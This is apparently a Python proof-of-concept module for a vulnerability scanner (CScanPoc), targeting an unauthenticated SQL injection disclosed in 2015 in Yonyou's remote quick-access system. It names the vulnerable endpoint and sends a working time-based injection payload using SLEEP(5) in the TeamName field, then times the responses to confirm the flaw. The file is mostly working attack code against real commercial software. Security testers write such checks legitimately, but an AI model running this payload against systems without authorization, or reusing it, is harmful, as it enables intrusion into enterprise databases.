# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0028'  # 平台漏洞编号，留空
    name = '用友优普远程快速接入系统SQL注入漏洞 '  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-12-17'  # 漏洞公布时间
    desc = '''
        用友优普远程快速接入系统SQL注入漏洞（无需登陆/影响大量企业)
    '''  # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0152899'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2f1fe3ed-dc43-48cd-b4f7-e0af43a6d2a6'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/Server/CmxItem.php?pgid=System_UpdateSave"
            url = arg + payload
            postpayload = "TeamName=test' AND (SELECT * FROM (SELECT SLEEP(5))usqH)%23"
            time0 = time.time()
            code, head, res, errcode, _ = hh.http(url, postpayload)
            time1 = time.time()
            code, head, res, errcode, _ = hh.http(url)
            time2 = time.time()
            if ((time1 - time0) - (time2 - time1)) >= 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
